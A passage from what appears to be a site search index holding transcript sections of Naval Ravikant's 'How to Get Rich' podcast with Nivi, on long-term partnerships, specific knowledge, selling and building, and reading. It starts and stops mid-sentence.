long-term people. So, those people have to signal that they\u2019re going to be around for a long time. That they\u2019re ethical. And their ethics are visible through their actions. Long-term players make each other rich Nivi: In a long-term game, it seems that everybody is making each other rich. And in a short-term game, it seems like everybody is making themselves rich. Naval: I think that is a brilliant formulation. In a longterm game, it\u2019s positive sum. We\u2019re all baking the pie together. We\u2019re trying to make it as big as possible. And in a short term game, we\u2019re cutting up the pie. Now this is not to excuse the socialists, right? The socialists are the people who are not involved in baking the pie, who show up at the end, and say, \u201cI want a slice, or I want the whole pie.\u201d They show up with the guns. But I think a good leader doesn\u2019t take credit. A good leader basically tries to inspire people, so the team gets the job done. And then things get divided up according to fairness, and who contributed how much, or as close to it as possible, and took a risk, as opposed to just whoever has the longest knife\u2026 the sharpest knife at the end. Returns come from compound interest in iterated games Nivi: So, these next two tweets are, \u201cPlay iterated games. All returns in life, whether in wealth, relationships, or knowledge come from compound interest.\u201d Naval: When you have been doing business with somebody, you\u2019ve been friends with somebody for ten years, twenty years, thirty years, it just gets better and better because you trust them so easily. The friction goes down, you can do bigger, and bigger things together. For example, the simplest one is getting married to someone, and having kids, and raising children. That\u2019s compound interest, right? Investing in those relationships. Those relationships end up being invaluable compared to more casual relationships. It\u2019s true in health and fitness. You know, the fitter you are, the easier it is to stay fit. Whereas the more you deteriorate your body, the harder it is to come back, and claw your way back to a baseline. It requires heroic acts. Nivi: Regarding compound interest, I think I saw retweet something a while back. Maybe it was from Ed Latimore. It went something along the lines of, \u201cGet some traction. Get purchase, and don\u2019t lose it\u201d [correction: the tweet is by @ mmay3r ]. So, the idea was to gain some initial traction, and never fall back, just keep ratcheting up, and up. Naval: I don\u2019t remember it exactly. But I think that was right. Yes, it was like, \u201cGet traction, and don\u2019t let go.\u201d It was a good one, yes.","title":"Play Long-Term Games With Long-Term People"},{"location":"other/How%20to%20Get%20Rich/#pick-partners-with-intelligence-energy-and-integrity","text":"You can\u2019t compromise on any of these three Pick business partners with high intelligence, energy and integrity Naval: In terms of picking people to work with, pick ones that have high intelligence, high energy, and high integrity, I find that\u2019s the three-part checklist that you cannot compromise on. You need someone who is smart, or they\u2019ll head in the wrong direction. And you\u2019re not going to end up in the right place. You need someone high-energy because the world is full of smart, lazy people. We all know people in our life who are really smart, but can\u2019t get out of bed, or lift a finger. And we also know people who are very high energy, but not that smart. So, they work hard, but they\u2019re sort of running in the wrong direction. And smart is not a pejorative. It\u2019s not meant to say someone is smart, someone else is stupid. But it\u2019s more that everyone is smart at different things. So, depending on what you want to do well, you have to find someone who is smart at that thing. And then energy, a lot of times people are unmotivated for a specific thing, but they\u2019re motivated for other things. So, for example, someone might be really unmotivated to go to a job, and sit in an office. But they might be really motivated to go paint, right? Well, in that case they should be a painter. They should be putting art up on the internet. Trying to figure out how to build a career out of that, rather than wearing a collar around their neck, and going to a dreary job. And then high integrity is the most important because otherwise if you\u2019ve got the other two, what you have is you have a smart and hard working crook, who\u2019s eventually going to cheat you. So, you have to figure out if the person is high-integrity. And as we talked about, the way you do that is through signals. And signals is what they do, not what they say. It\u2019s all the non-verbal stuff that they do when they think nobody is looking. Motivation has to come intrinsically Nivi: With respect to the energy, there was this interesting thing from Sam Altman a while back, where he was talking about delegation, and he was saying, \u201cOne of the important things for delegation is, delegate to people who are actually good at the thing that you want them to do.\u201d It\u2019s the most obvious thing, but it seems like\u2026 you want to partner with people who are naturally going to do the things that you want them to do. Naval: Yeah. I almost won\u2019t start a company, or hire a person, or work with somebody if I just don\u2019t think they\u2019re into what I want them to do. When I was younger, I used to try and talk people into things. I had this idea that you could sell someone into doing something. But you can\u2019t. You can\u2019t keep them motivated. You can get them inspired initially. It might work if you\u2019re a king like Henry V, and you\u2019re trying to get them to just charge into battle, and then they\u2019ll figure it out. But if you\u2019re trying to keep someone motivated for the long-term, that motivation has to come intrinsically. You can\u2019t just create it, nor can you be the crutch for them if they don\u2019t have that intrinsic motivation. So, you have to make sure people actually are high-energy, and want to do what you want them to do, and what you want to work with them on. Integrity is what someone does, despite what they say they do Reading signals is very, very important. Signals are what people do despite what they say. So, it\u2019s important to pay attention to subtle signals. We all know that socially if someone treats a waiter, or waitress in a restaurant really badly, then it\u2019s only a matter of time until they treat you badly. If somebody screws over an enemy, and is vindictive towards them, well it\u2019s only a matter of time before they redefine you from friend to enemy, and you feel their wrath. So, angry, outraged, vindictive, short-term thinking people are essentially that way in many interactions in real life. People are oddly consistent. That\u2019s one of the things you learn about them. So, you want to find long-term people. You want to find people who seem irrationally ethical. For example, I had a friend of mine whose company I invested in, and the company failed, and he could have wiped out all of the investors. But he kept putting more and more personal money in. Through three different pivots he put personal money in until the company finally succeeded. And in the process, he never wiped out the investors. And I was always grateful to him for that. I said, \u201cWow, that\u2019s amazing that you were so good to your investors. You didn\u2019t wipe them out.\u201d And he got offended by that. He said, \u201cI didn\u2019t do it for you. I didn\u2019t do it for my investors. I did it for me. It\u2019s my own self-esteem. It\u2019s what I care about. That\u2019s how I live my life.\u201d That\u2019s the kind of person you want to work with. Another quote that I like, I have a tweet on this. I think I read this somewhere else, so I\u2019m not taking credit for this. But I kind of modified it a little bit. Which is that \u201cself-esteem is the reputation that you have with yourself.\u201d You\u2019ll always know. So, good people, moral people, ethical people, easy to work with people, reliable people, tend to have very high self-esteem because they have very good reputations with themselves, and they understand that. It\u2019s not ego. Self-esteem and ego are different things. Because ego can be undeserved, but self-esteem at least you feel like you lived up to your own internal moral code of ethics. And so it\u2019s very hard to work with people who end up being low integrity. And it\u2019s hard to figure out who is high integrity and low integrity. Generally, the more someone is saying that they\u2019re moral, ethical, and high integrity, the less likely they are to be that way. It\u2019s very much like status signalling. If you overtly bid for status, if you overtly talk about being high status, that is a low status move. If you openly talk about how honest, reliable, and trustworthy you are, you\u2019re probably not that honest and trustworthy. That is a characteristic of con men. So, yeah, pick an industry in which you can play long-term games with long-term people.","title":"Pick Partners With Intelligence, Energy and Integrity"},{"location":"other/How%20to%20Get%20Rich/#partner-with-rational-optimists","text":"Don\u2019t partner with cynics and pessimists; their beliefs are self-fulfilling Don\u2019t partner with pessimists Nivi: Let\u2019s do this last tweet. You said, \u201cDon\u2019t partner with cynics, and pessimists. Their beliefs are self-fulfilling.\u201d Naval: Yes. Essentially, to create things, you have to be a rational optimist. Rational in the sense that you have to see the world for what it really is. And yet you have to be optimistic about your own capabilities, and your capability to get things done. We all know people who are consistently pessimistic, who will shoot down everything. Everyone in their life has the helpful critical guy, right? He thinks he\u2019s being helpful, but he\u2019s actually being critical, and he\u2019s a downer on everything. That person will not only never do anything great in their lives, they\u2019ll prevent other people around them from doing something great. They think their job is to shoot holes in things. And it\u2019s okay to shoot holes in things as long as you come up with a solution. There\u2019s also the classic military line, \u201cEither lead, follow, or get out of the way.\u201d And these people want a fourth option, where they don\u2019t want to lead, they don\u2019t want to follow, but they don\u2019t want to get out of the way. They want to tell you why the thing is not going to work. And all the really successful people I know have a very strong action bias. They just do things. The easiest way to figure out if something is viable or not is by doing it. At least do the first step, and the second step, and the third, and then decide. So, if you want to be successful in life, creating wealth, or having good relationships, or being fit, or even being happy, you need to have an action bias towards getting what you want. Partner with rational optimists And you have to be optimistic about it. Not irrationally. You know, there\u2019s nothing worse than someone who is foolhardy and chasing something that\u2019s not worth it. That\u2019s why I say rational optimist. But you have to be rational. Know all the pitfalls. Know the downsides, but still keep your chin up. You\u2019ve got one life on this planet. Why not try to build something big? This is the beauty of Elon Musk, and why I think he inspires so many people, it\u2019s just because he takes on really, really big audacious tasks. And he provides an example for people to think big. And it takes a lot of work to build even small things. I don\u2019t think the corner grocery store owner is working any less hard than Elon Musk, or pouring any less sweat and toil into it. Maybe even more. But for whatever reason, education, circumstance, they didn\u2019t get the chance to think as big, so the outcome is not as big. So, it\u2019s just better to think big. Obviously, rationally, within your means, stay optimistic. The cynics and the pessimists, what they\u2019re really saying, it\u2019s unfortunate, but they\u2019re basically saying, \u201cI\u2019ve given up. I don\u2019t think I can do anything. And so the world to me just looks like a world where nobody can do anything. And so why should you go do something because if you fail, then I\u2019m right, which is great. But if you succeed, then you just make me look bad.\u201d We descended from pessimists Nivi: Yes, it\u2019s probably better to be an irrational optimist, then it is to be a rational cynic. Naval: There\u2019s a completely rational frame on why you should be an optimist. Historically, if you go back 2,000 years, 5,000 years, 10,000 years, two people are wandering through a jungle, they hear a tiger. One\u2019s an optimist, and says, \u201cOh, it\u2019s not headed our way.\u201d The other one says, \u201cI\u2019m a pessimist, I\u2019m out of here.\u201d And the pessimist runs and survives, and the optimist gets eaten. So, we\u2019re descended from pessimists. We\u2019re genetically hardwired to be pessimists. But modern society is far, far safer. There are no tigers wandering around the street. It\u2019s very unlikely that you will end up in total ruin, although you should avoid total ruin. Much more likely that the upside is unlimited, and the downside is limited. So, adapting for modern society means overriding your pessimism, and taking slightly irrationally optimistic bets because the upside is unlimited if you start the next SpaceX, or Tesla, or Uber, you can make billions of dollars of value for society, and for yourself, and change the world. And if you fail, what\u2019s the big deal? You lost a few million dollars of investor money, and they\u2019ve got plenty more, and that\u2019s the bet they take on the chances that you will succeed. It made sense to be pessimistic in the past. It makes sense to be optimistic today, especially if you\u2019re educated and living in a First World country. Even a Third World country. I actually think the economic opportunities in Third World countries are much larger. The one thing you have to avoid is the risk of ruin. Ruin means stay out of jail. So, don\u2019t do anything that\u2019s illegal. It\u2019s never worth it to wear an orange jumpsuit. And stay out of total catastrophic loss. That could mean that you stay out of things that could be physically dangerous, hurt your body. You have to watch your health. And stay out of things that can cause you to lose all of your capital, all of your savings. So, don\u2019t gamble everything on one go. But take rationally optimistic bets with big upside. BOCTAOE Nivi: I think there\u2019s people that will try and build up your ideas, and build on your ideas, no matter how far fetched they might seem. And then there are people who list all of the obvious exceptions, no matter how obvious they are. And fortunately in the startup world, I don\u2019t even really get exposed to the people that are giving you the obvious exceptions, and all the reasons it\u2019s not going to work. I barely get exposed to that anymore. Naval: That\u2019s what Twitter is for. Scott Adams got so annoyed by this that he came up with a phrase, an acronym, which is \u201cbut of course there are obvious exceptions\u201d, BOCTAOE. And he used to pin that acronym at the end of his articles for a while. But Twitter is overrun with nitpickers. Whereas exactly as you were pointing out, Silicon Valley has learned that the upside is so great that you never look down on the kid who\u2019s wearing a hoodie and has coffee on his shoes. And just looks like a slob because you don\u2019t know if he\u2019s going to be the next Mark Zuckerberg, or the next Reid Hoffman. So, you\u2019ve got to treat everybody with respect. You\u2019ve got to look up to every possibility, and opportunity because the upside is so unlimited, and the downside is so limited in the modern world, especially with financial assets and instruments.","title":"Partner With Rational Optimists"},{"location":"other/How%20to%20Get%20Rich/#arm-yourself-with-specific-knowledge","text":"Specific knowledge can be found by pursuing your genuine curiosity Arm yourself with specific knowledge Nivi: Do you want to talk a little bit about the skills that you need, in particular specific knowledge, accountability, leverage and judgment. So, the first tweet in this area is \u201cArm yourself with specific knowledge accountability and leverage.\u201d And I\u2019ll throw in judgment as well. I don\u2019t think you covered that in that particular tweet. Naval: If you want to make money you have to get paid at scale. And why you, that\u2019s accountability, at scale, that\u2019s leverage, and just you getting paid as opposed to somebody else getting paid , that\u2019s specific knowledge. So, specific knowledge is probably the hardest thing to get across in this whole tweetstorm, and it\u2019s probably the thing that people get the most confused about. The thing is that we have this idea that everything can be taught, everything can be taught in school. And it\u2019s not true that everything can be taught. In fact, the most interesting things cannot be taught. But everything can be learned. And very often that learning either comes from some innate characteristics in your DNA, or it could be through your childhood where you learn soft skills which are very, very hard to teach later on in life, or it\u2019s something that is brand new so nobody else knows how to do it either, or it\u2019s true on the job training because you\u2019re pattern matching into highly complex environments, basically building judgment in a specific domain. Classic example is investing, but it could be in anything. It could be in judgment in running a fleet of trucks, it could be judgment in weather forecasting. So, specific knowledge is the knowledge that you care about. Especially if you\u2019re later in life, let\u2019s say your post 20, 21, 22, you almost don\u2019t get to choose which specific knowledge you have. Rather, you get to look at what you have already built by that point in time, and then you can build on top of it. Specific knowledge can\u2019t be trained The first thing to notice about specific knowledge is that you can\u2019t be trained for it. If you can be trained for it, if you can go to a class and learn specific knowledge, then somebody else can be trained for it too, and then we can mass-produce and mass-train people. Heck, we can even program computers to do it and eventually we can program robots to walk around doing it. So, if that\u2019s the case, then you\u2019re extremely replaceable and all we have to pay you is the minimum wage that we have to pay you to get you to do it when there are lots of other takers who can be trained to do it. So really, your returns just devolve into your cost of training plus the return on investment on that training. So, you really want to pick up specific knowledge, you need your schooling, you need your training to be able to capitalize on the best specific knowledge, but the part of it that you\u2019re going to get paid for is the specific knowledge. Specific knowledge is found by pursuing your curiosity For example, someone who goes and gets a degree in psychology and then becomes a salesperson. Well if they were already a formidable salesperson, a high grade salesmanship to begin with, then the psychology degree is leverage, it arms them and they do much better at sales. But if they were always an introvert never very good at sales and they\u2019re trying to use psychology to learn sales, they\u2019re just not going to get that great at it. So, specific knowledge is found much more by pursuing your innate talents, your genuine curiosity, and your passion. It\u2019s not by going to school for whatever is the hottest job, it\u2019s not for going into whatever field investors say is the hottest. Very often specific knowledge is at the edge of knowledge. It\u2019s also stuff that\u2019s just being figured out or is really hard to figure out. So, if you\u2019re not 100% into it somebody else who is 100% into it will outperform you. And they won\u2019t just outperform you by a little bit, they\u2019ll outperform you by a lot because now we\u2019re operating the domain of ideas, compound interest really applies and leverage really applies. So, if you\u2019re operating with 1,000 times leverage and somebody is right 80% of the time, and somebody else is right 90% of time, the person who\u2019s right 90% of the time will literally get paid hundreds of times more by the market because of the leverage and because of the compounding factors and being correct. So, you really want to make sure you\u2019re good at it so that genuine curiosity is very important. Building specific knowledge will feel like play to you So, very often, it\u2019s not something you sit down and then you reason about, it\u2019s more found by observation. You almost have to look back on your own life and see what you\u2019re actually good at. For example, I wanted to be a scientist and that is where a lot of my moral hierarchy comes from. I view scientists sort of at the top of the production chain for humanity. And the group of scientists who have made real breakthroughs and contributions that probably added more to human society, I think, than any single other class of human beings. Not to take away anything from art or politics or engineering or business, but without the science we\u2019d still be scrambling in the dirt fighting with sticks and trying to start fires. My whole value system was built around scientists and I wanted to be a great scientist. But when I actually look back at what I was uniquely good at and what I ended up spending my time doing, it was more around making money, tinkering with technology, and selling people on things. Explaining things, talking to people. So, I have some sales skills, which is a form specific knowledge that I have. I have some analytical skills around how to make money. And I have this ability to absorb data, obsess about it, and break it down and that is a specific skill that I have. I also just love tinkering with technology. And all of this stuff feels like play to me, but it looks like work to others. So, there are other people to whom these things would be hard and they say like, \u201cWell, how do I get good at being pithy and selling ideas?\u201d Well, if you\u2019re not already good at it or if you\u2019re not really into it, maybe it\u2019s not your thing, focus on the thing that you are really into. This is ironic, but the first person to actually point out my real specific knowledge was my mother. She did it as an aside, talking from the kitchen and she said it when I was like 15 or 16 years old. I was telling a friend of mine that I want to be an astrophysicist and she said, \u201cNo, you\u2019re going to go into business.\u201d I was like, \u201cWhat, my mom\u2019s telling me I\u2019m going to be in business. I\u2019m going to be an astrophysicist. Mom doesn\u2019t know she\u2019s talking about.\u201d But mom knew exactly what she was talking about. She\u2019d already observed that every time we walk down the street, I would critique the local pizza parlor on why they were selling their slices a certain way with certain toppings and why their process of ordering was this way when it should have been that way. So, she knew that I had more of a business curious mind, but then my obsession with science combined to create technology and technology businesses where I found myself. So, very often, your specific knowledge is observed and often observed by other people who know you well and revealed in situations rather than something that you come up with.","title":"Arm Yourself With Specific Knowledge"},{"location":"other/How%20to%20Get%20Rich/#specific-knowledge-is-highly-creative-or-technical","text":"Specific knowledge is on the bleeding edge of technology, art and communication Specific knowledge can be taught through apprenticeships Naval: To the extent that specific knowledge is taught, it\u2019s on the job. It\u2019s through apprenticeships. And that\u2019s why the best businesses, the best careers are the apprenticeship or self-taught careers, because those are things society still has not figured out how to train and automate yet. The classic line here is that Warren Buffett went to Benjamin Graham when he got out of school. Benjamin Graham was the author of the Intelligent Investor and sort of modernized or created value investing as a discipline. And Warren Buffett went to Benjamin Graham and offered to work for him for free. And Graham said, \u201cActually, you\u2019re overpriced, free is overpriced.\u201d And Graham was absolutely right. When it comes to a very valuable apprenticeship like the type that Graham was going to give Buffet, Buffet should have been paying him a lot of money. That right there tells you that those are skills worth having. Specific knowledge is often highly creative or technical Specific knowledge also tends to be technical and creative. It\u2019s on the bleeding edge of technology, on the bleeding edge of art, on the bleeding edge of communication. Even today, for example, there are probably meme lords out there on the Internet who can create incredible memes that will spread the idea to millions of people. Or are very persuasive \u2013 Scott Adams is a good example of this. He is essentially becoming one of the most credible people in the world by making accurate predictions through persuasive arguments and videos. And that is specific knowledge that he has built up over the years because he got obsessed with hypnosis when he was young, he learned how to communicate through cartooning, he embraced Periscope early, so he\u2019s been practicing lots of conversation, he\u2019s read all the books on the topic, he\u2019s employed it in his everyday life. If you look at his girlfriend, she\u2019s this beautiful young Instagram model. That is an example of someone who has built up a specific knowledge over the course of his career. It\u2019s highly creative, it has elements of being technical in it, and it\u2019s something that is never going to be automated. No one\u2019s going to take that away from him, because he\u2019s also accountable under one brand as Scott Adams, and he\u2019s operating with the leverage of media with Periscope and drawing Dilbert cartoons and writing books. He has massive leverage on top of that brand and he can build wealth out of it if he wanted to build additional wealth beyond what he already has. Specific knowledge is specific to the individual and situation Nivi: Should we be calling it unique knowledge or does specific knowledge somehow make more sense for it? Naval: You know, I came up with this framework when I was really young. We\u2019re talking decades and decades. It\u2019s now probably over 30 years old. So, at the time specific knowledge stuck with me so that is how I think about it. The reason I didn\u2019t try and change it is because every other term that I found for it was overloaded in a different way. At least specific knowledge isn\u2019t that used. I can kind of rebrand it. The problem with unique knowledge is, yeah, maybe it\u2019s unique but if I learn it from somebody else it\u2019s no longer unique, then we both know it. So, it\u2019s not so much that it is unique, it\u2019s that it is highly specific to the situation, it\u2019s specific to the individual, it\u2019s specific to the problem, and it can only be built as part of a larger obsession, interest, and time spent in that domain. It can\u2019t just be read straight out of a single book, nor can it be taught in a single course, nor can it be programmed into a single algorithm. You can\u2019t be too deliberate about assembling specific knowledge Nivi: Speaking of Scott Adams, he\u2019s got a blog post on how to build your career by getting in, say, the top 25 percentile at three or more things. And by doing that, you become the only person in the world who can do those three things in the 25th percentile. So, instead of trying to be the best at one thing, you just try to be very, very good at three or more things. Is that a way of building specific knowledge? Naval: I actually think the best way is just to follow your own obsession. And somewhere in the back of your mind, you can realize that, actually, this obsession I like and I\u2019ll keep an eye out for the commercial aspects of it. But I think if you go around trying to build it a little too deliberately, if you become too goal-oriented on the money, then you won\u2019t pick the right thing. You won\u2019t actually pick the thing that you love to do, so you won\u2019t go deep enough into it. Scott Adams\u2019 observation is a good one, predicated on statistics. Let\u2019s say there\u2019s 10,000 areas that are valuable to the human race today in terms of knowledge to have, and the number one in those 10,000 slots is taken. Someone else is likely to be the number one in each of those 10,000, unless you happen to be one of the 10,000 most obsessed people in the world that at a given thing. But when you start combining, well, number 3,728 with top-notch sales skills and really good writing skills and someone who understands accounting and finance really well, when the need for that intersection arrives, you\u2019ve expanded enough from 10,000 through combinatorics to millions or tens of millions. So, it just becomes much less competitive. Also, there\u2019s diminishing returns. So, it\u2019s much easier to be top 5 percentile at three or four things than it is to be literally the number one at something. Build specific knowledge where you are a natural I think it\u2019s a very pragmatic approach. But I think it\u2019s important that one not start assembling things too deliberately because you do want to pick things where you are a natural. Everyone is a natural at something. We\u2019re all familiar with that phrase, a natural. \u201cOh, this person is a natural at meeting men or women, this person is a natural socialite, this person is a natural programmer, this person is a natural reader.\u201d So, whatever you are a natural at, you want to double down on that. And then there are probably multiple things you\u2019re natural at because personalities and humans are very complex. So, we want to be able to take the things that you are natural at and combine them so that you automatically, just through sheer interest and enjoyment, end up top 25% or top 10% or top 5% at a number of things.","title":"Specific Knowledge Is Highly Creative or Technical"},{"location":"other/How%20to%20Get%20Rich/#learn-to-sell-learn-to-build","text":"If you can do both, you will be unstoppable Learn to sell, learn to build Nivi: Talking about combining skills, you said that you should \u201clearn to sell, learn to build, if you can do both, you will be unstoppable.\u201d Naval: This is a very broad category. It\u2019s two broad categories. One is building the product. Which is hard, and it\u2019s multivariate. It can include design, it can include development, it can include manufacturing, logistics, procurement, it can even be designing and operating a service. It has many, many definitions. But in every industry, there is a definition of the builder. In our tech industry it\u2019s the CTO, it\u2019s the programmer, it\u2019s the software engineer, hardware engineer. But even in the laundry business, it could be the person who\u2019s building the laundry service, who is making the trains run on time, who\u2019s making sure all the clothes end up in the right place at the right time, and so on. The other side of it is sales. Again, selling has a very broad definition. Selling doesn\u2019t necessarily just mean selling individual customers, but it can mean marketing, it can mean communicating, it can mean recruiting, it can mean raising money, it can mean inspiring people, it could mean doing PR. It\u2019s a broad umbrella category. The Silicon Valley model is a builder and seller So, generally, the Silicon Valley startup model tends to work best. It\u2019s not the only way, but it is probably the most common way, when you have two founders, one of whom is world class at selling, and one of whom is world class at building. Examples are, of course, Steve Jobs and Steve Wozniak with Apple, Gates and Allen probably had similar responsibilities early on with Microsoft, Larry and Sergey probably broke down along those lines, although it\u2019s a little different there because that was a very technical product delivered to end users through a simple interface. But generally, you will see this pattern repeated over and over. There\u2019s a builder and there\u2019s a seller. There\u2019s a CEO and CTO combo. And venture and technology investors are almost trained to look for this combo whenever possible. It\u2019s the magic combination. If you can do both you will be unstoppable The ultimate is when one individual can do both. That\u2019s when you get true superpowers. That\u2019s when you get people who can create entire industries. The living example is Elon Musk. He may not necessarily be building the rockets himself, but he understands enough that he actually makes technical contributions. He understands the technology well enough that no one\u2019s going to snow him on it, and he\u2019s not running around making claims that he doesn\u2019t think he can\u2019t eventually deliver. He may be optimistic on the timelines but he thinks this is within reasonableness for delivery. Even Steve Jobs developed enough product skills and was involved enough in the product that he also operated in both of these domains. Larry Ellison started as a programmer and I think wrote the first version of Oracle, or was actually heavily involved in it. Marc Andreessen was also in this domain. He may not have had enough confidence in his sales skills, but he was the programmer who wrote Netscape Navigator, or a big chunk of it. So, I think the real giants in any field are the people who can both build and sell. I\u2019d rather teach an engineer marketing than a marketer engineering And usually the building is a thing that a sales person can\u2019t pick up later in life. It requires too much focused time. But a builder can pick up selling a little bit later, especially if they were already innately wired to be a good communicator. Bill Gates famously paraphrases this as, \u201cI\u2019d rather teach an engineer marketing, than a marketer engineering.\u201d I think if you start out with a building mentality and you have building skills and it\u2019s still early enough in your life, or you have enough focused time that you think you can learn selling, and you have some natural characteristics or you\u2019re a good salesperson, then you can double down on those. Now, your sales skills could be in a different than traditional domain. For example, let\u2019s say you\u2019re a really good engineer and then people are saying, well, now you need to be good at sales, well, you may not be good at hand-to-hand sales, but you may be a really good writer. And writing is a skill that can be learned much more easily than, say, in-person selling, and so you may just cultivate writing skills until you become a good online communicator and then use that for your sales. On the other hand, it could just be that you\u2019re a good builder and you\u2019re bad at writing and you don\u2019t like communicating to mass audiences but you\u2019re good one-on-one, so then you might use your sales skills for recruiting or for fundraising, which are more one-on-one kinds of endeavors. This is pointing out that if you\u2019re at the intersection of these two, don\u2019t despair because you\u2019re not going to be the best technologist and you\u2019re not going to be the best salesperson, but in a weird way, that combination, back to the Scott Adams skill stack, that combination of two skills is unstoppable. Long term, people who understand the underlying product and how to build it and can sell it, these are catnip to investors, these people can break down walls if they have enough energy, and they can get almost anything done. Nivi: If you could only pick one to be good at, which one would you pick? Naval: When you\u2019re trying to stand out from the noise building is actually better because there\u2019re so many hustlers and sales people who have nothing to back them up. When you\u2019re starting out, when you\u2019re trying to be recognized, building is better. But much later down the line building gets exhausting because it is a focus job and it\u2019s hard to stay current because there\u2019s always new people, new products coming up who have newer tools, and frankly more time because it\u2019s very intense, it\u2019s a very focused task. So, sales skills actually scale better over time. Like for example, if you have a reputation for building a great product, that\u2019s good, but when you ship your new product, I\u2019m going to validate it based on the product. But if you have a reputation for being a good person to do business with and you\u2019re persuasive and communicative then that reputation almost becomes self-fulfilling. So, I think if you only had to pick up one, you can start with building and then transition to selling. This is a cop-out answer, but I think that is actually the right answer.","title":"Learn to Sell, Learn to Build"},{"location":"other/How%20to%20Get%20Rich/#read-what-you-love-until-you-love-to-read","text":"You should be able to pick up any book in the library and read it Read what you love until you love to read Nivi: Before we go and talk about accountability and leverage and judgment, you\u2019ve got a few tweets further down the line that I would put in the category of continuous learning. They\u2019re essentially, \u201cthere is no skill called business. Avoid business magazines and business class, study microeconomics, game theory, psychology, persuasion, ethics, mathematics and computers.\u201d There\u2019s one other comment that you made in a Periscope that was, \u201cyou should be able to pick up any book in the library and read it.\u201d And the last tweet in this category was, \u201creading is faster than listening, doing is faster than watching.\u201d Naval: Yeah, the most important tweet on this, I don\u2019t even have in here unfortunately, which is, the foundation of learning is reading. I don\u2019t know a smart person who doesn\u2019t read and read all the time. And the problem is, what do I read? How do I read? Because for most people it\u2019s a struggle, it\u2019s a chore. So, the most important thing is just to learn how to educate yourself and the way to educate yourself is to develop a love for reading. So, the tweet that is left out, the one that I was hinting at is, \u201cread what you love until you love to read.\u201d It\u2019s that simple. Everybody I know who reads a lot loves to read, and they love to read because they read books that they loved. It\u2019s a little bit of a catch-22, but you basically want to start off just reading wherever you are and then keep building up from there until reading becomes a habit. And then eventually, you will just get bored of the simple stuff. So you may start off reading fiction, then you might graduate to science fiction, then you may graduate to non-fiction, then you may graduate to science, or philosophy, or mathematics or whatever it is, but take your natural path and just read the things that interest you until you kind of understand them. And then you\u2019ll naturally move to the next thing and the next thing and the next thing. Read the original scientific books in a field Now, there is an exception to this, which is where I was hinting with what things you actually do want to learn, which is, at some point there\u2019s too much out there to read. Even reading is full of junk. There are actually things you can read, especially early on, that will program your brain a certain way, and then later things that you read, you will decide whether those things are true or false based on the earlier things. So, it is important that you read foundational things. And foundational things, I would say, are the original books in a given field that are very scientific in their nature. For example, instead of reading a business book, pick up Adam Smith\u2019s The Wealth of Nations. Instead of reading a book on biology or evolution that\u2019s written today, I would pick up Darwin\u2019s Origin of the Species. Instead of reading a book on biotech right now that may be very advanced, I would just pick up The Eighth Day of Creation by Watson and Crick. Instead of reading advanced books on what cosmology and what Neil Degrasse Tyson and Stephen Hawking have been saying, you can pick up Richard Feynman\u2019s Six Easy Pieces and start with basic physics. Don\u2019t fear any book If you understand the basics, especially in mathematics and physics and sciences, then you will not be afraid of any book. All of us have that memory of when we were sitting in class and we\u2019re learning mathematics, and it was all logical and all made sense until at one point the class moved too fast and we fell behind. Then after that we were left memorizing equations, memorizing concepts without being able to derive them from first principles. And at that moment, we\u2019re lost, because unless you\u2019re a professional mathematician, you\u2019re not going to remember those things. All you\u2019re going to remember are the techniques, the foundations. So, you have to make sure that you\u2019re building on a steel frame of understanding because you\u2019re putting together a foundation for skyscraper, and you\u2019re not just memorizing things because you\u2019re just memorizing things you\u2019re lost. So the foundations are ultra important. And the ultimate, the ultimate is when you walk into a library and you look at it up and down and you don\u2019t fear any book. You know that you can take any book off the shelf, you can read it, you can understand it, you can absorb what is true, you can reject what is false, and you have a basis for even working that out that is logical and scientific and not purely just based on opinions. The means of learning are abundant; the desire to learn is scarce The beauty of the internet is the entire library of Alexandria times 10 is at your fingertips at all times. It\u2019s not the means of education or the means of learning are scarce, the means of learning are abundant. It\u2019s the desire to learn that\u2019s scarce. So, you really have to cultivate the desire. And it\u2019s not even cultivating you\u2019ve to not lose it. Children have a natural curiosity. If you go to a young child who\u2019s first learning language, they\u2019re pretty much always asking: What\u2019s this? What\u2019s that? Why is this? Who\u2019s that? They\u2019re always asking questions. But one of the problems is that schools and our educational system, and even our way of raising children replaces curiosity with compliance. And once you replace the curiosity with the compliance, you get an obedient factory worker, but you no longer get a creative thinker. And you need creativity, you need the ability to feed your own brain to learn whatever you want.","title":"Read What You Love Until You Love to Read"},{"location":"other/How%20to%20Get%20Rich/#the-foundations-are-math-and-logic","text":"Mathematics and logic are the basis for understanding everything else The ultimate foundations are math and logic Naval: Foundational things are principles, they\u2019re algorithms, they\u2019re deep seated logical understanding where you can defend it or attack it from any angle. And that\u2019s why microeconomics is important because macroeconomics is a lot of memorization, a lot of macro bullshit. As Nassim Taleb says, it is easier to macro bullshit than it is the micro bullshit. Because macroeconomics is voodoo-complex-science meets politics. You can\u2019t find two macroeconomists to agree on anything these days, and different macroeconomists get used by different politicians to peddle their different pet theories. There are even macroeconomists out there now peddling something called Modern Monetary Theory which basically says, hey, except for this pesky thing called inflation, we can just print all the money that we want. Yes, except for this pesky thing called inflation. That\u2019s like saying, except for limited energy, we can fire rockets off into space all day long. It\u2019s just nonsense, but the fact that there are people who have \u201cmacroeconomist\u201d in their title and are peddling Modern Monetary Theory just tells you that macroeconomics as a so-called science has been corrupted. It\u2019s now a branch of politics. So, you really want to focus on the foundations. The ultimate foundation are mathematics and logic. If you understand logic and mathematics, then you have the basis for understanding the scientific method. Once you understand the scientific method, then you can understand how to separate truth from falsehood in other fields and other things that you\u2019re reading. It\u2019s better to read a great book slowly than to fly through a hundred books quickly So, be very careful about reading other people\u2019s opinions and even be careful when reading facts because so-called facts are often just opinions with a veneer [of pseudoscience] around them. What you are really looking for are algorithms. What you are really looking for is understanding. It\u2019s better to go through a book really slowly and struggle and stumble and rewind, than it is to fly through it quickly and say, \u201cWell, now I\u2019ve read 20 books, I\u2019ve read 30 books, I\u2019ve read 50 books in the field.\u201d It\u2019s like Bruce Lee said, \u201cI don\u2019t fear the man who knows a thousand kicks and a thousand punches, I fear the man who\u2019s practiced one punch ten thousand times or one kick ten thousand times.\u201d It\u2019s that understanding that comes through repetition and through usage and through logic and foundations that really makes you a smart thinker. Learn persuasion and programming Nivi: To lay a foundation for learning for the rest of your life I think you need two things, if I was going to try and sum it up. One, practical persuasion and two, you need to go deep in some technical category, whether it\u2019s abstract math, or you want to read Donald Knuth\u2019s books on algorithms, or you want to read Feynman\u2019s lectures on physics. If you have practical persuasion and a deep understanding of some complex topic, I think you\u2019ll have a great foundation for learning for the rest of your life. Naval: Yeah. In fact let me expand that a little bit. I would say that the five most important skills are of course, reading, writing, arithmetic, and 